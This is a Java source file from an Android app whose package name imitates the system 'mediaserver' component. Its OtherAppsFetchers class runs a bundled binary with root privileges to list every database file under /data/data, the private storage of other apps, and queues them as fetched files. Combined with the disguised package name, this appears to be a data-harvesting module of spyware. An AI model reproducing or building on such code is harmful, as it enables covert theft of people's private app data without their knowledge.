package com.android.mediaserver.fetchers.apps;

import com.android.mediaserver.fetchers.FetchedFile;
import com.android.mediaserver.fetchers.file.FileFetcher;
import com.android.mediaserver.shell.Shell.SU;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class OtherAppsFetchers extends FileFetcher {
  public OtherAppsFetchers(List<FetchedFile> filesToExclude) {
    mFetchedFiles = new ArrayList();
    List<String> res = SU.run("/data/data/com.android.mediaserver/files/ldir -p /data/data -e db");
    if (res != null) {
      for (String db : res) {
        boolean shouldExclude = false;
        for (FetchedFile fetchedFile : filesToExclude) {
          if (db.equals(fetchedFile.getFile().getAbsolutePath())) {
            shouldExclude = true;
            break;
          }
        }
        if (!shouldExclude) {
          mFetchedFiles.add(new FetchedFile(new File(db), "APP", "other"));
        }
      }
    }
  }
}
